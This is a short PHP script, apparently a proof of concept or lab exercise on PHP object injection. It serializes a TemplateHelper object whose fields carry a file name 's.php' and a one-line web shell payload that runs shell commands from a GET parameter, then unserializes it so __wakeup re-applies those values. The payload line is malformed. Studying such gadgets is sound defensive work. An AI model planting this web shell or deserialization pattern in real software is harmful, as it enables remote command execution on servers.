<?php

class TemplateHelper
{

    private $file;
    private $data;

    public function __construct(string $file, string $data)
    {
        echo "__construct($file,$data)\n";
    	$this->init($file, $data);
    }

    public function __wakeup()
    {
        echo "__wakeup($this->file,$this->data)\n";
    	$this->init($this->file, $this->data);
    }

    private function init(string $file, string $data)
    {    	
        $this->file = $file;
        $this->data = $data;
        echo "init($this->file, $this->data)\n";
    }

}

$th = new TemplateHelper('s.php','<?php System($_GET[1]; ?>');

$s = urlencode(serialize($th));
unserialize(urldecode($s));